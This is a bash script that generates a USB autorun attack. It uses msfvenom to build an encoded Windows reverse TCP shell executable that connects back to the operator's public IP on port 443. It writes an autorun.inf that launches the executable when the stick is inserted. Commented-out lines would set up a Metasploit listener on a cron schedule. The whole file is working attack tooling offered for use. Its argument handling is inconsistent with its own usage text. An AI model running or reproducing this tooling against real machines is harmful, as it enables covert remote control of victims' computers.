#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+--------------------------------------------------+"
echo -e "|  Adversarial Informatics USB ReverseTCP Autorun  |"
echo -e "|               cygienesolutions.com               |"
echo -e "|       [Usage]: ./usb_aic_gen.sh <SVR> <PORT>     |"
echo -e "+--------------------------------------------------+"
echo -e "${NC}"
echo -e "Retrieving public IP address..."
PUB=$(curl -s "http://myexternalip.com/raw")
if [ $# == 0 ] ; then
    echo "Public IP: $PUB"
    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
    echo ""
    echo "[*] Run this script with the local IP and Port Number."
    echo "[Usage]: ./usb_aic_gen.sh <IP> <PORT>"
    echo ""
    exit 1; fi

TYPE="$1"
SERVER="$2"
PORT="$3"

#Generate a file or script, based on the type
echo -e "${GREEN}"
echo -e "Generating reverse shell to connect back to $PUB:443..."
echo -e "${NC}"
msfvenom -p windows/shell_reverse_tcp LHOST=$PUB LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shded.exe
echo -e "${GREEN}"
echo -e "${NC}"

#Create an autorun.inf file that executes the reverse shell
echo -e "${GREEN}"
echo -e "Generating an autorun.inf file to connect back to launch the reverse shell..."
echo '[autorun]' > autorun.inf
echo 'open=shded.exe' >> autorun.inf
echo 'icon=autorun.ico' >> autorun.inf
echo -e "${NC}"

echo -e "${GREEN}"
echo -e "Copy the EXE and INF to your USB stick."
echo -e "${NC}"

##Create a backgrounded cronjob to start the reverse shell on the server
#echo "echo 'use exploit multi/handler' >> listen.rc " > listen5.sh
#echo "echo 'set payload windows/shell_reverse_tcp' >> listen.rc" >> listen5.sh
#echo "echo 'set lhost $1' >> listen.rc" >> listen5.sh
#echo "echo 'set lport $2' >> listen.rc" >> listen5.sh
#echo "echo 'set ExitOnSession false' >> listen.rc" >> listen5.sh
#echo "echo 'exploit -j' >> listen.rc" >> listen5.sh
#echo "msfconsole -r listen.rc" >> listen5.sh
#chmod 755 listen5.sh
#5 * * * * ./listen5.sh

#ls -l listen5.sh
ls -l *.inf
ls -l *.exe

#echo -e "${GREEN}"
#echo -e "Execute listen5.sh to start the listener.  "
#echo -e "${NC}"

echo -e "${YELLOW}"
echo "{Ӧ} Support The Free Information Movement {Ӧ}"
echo -e "${NC}"


#Automatically handle incoming connections



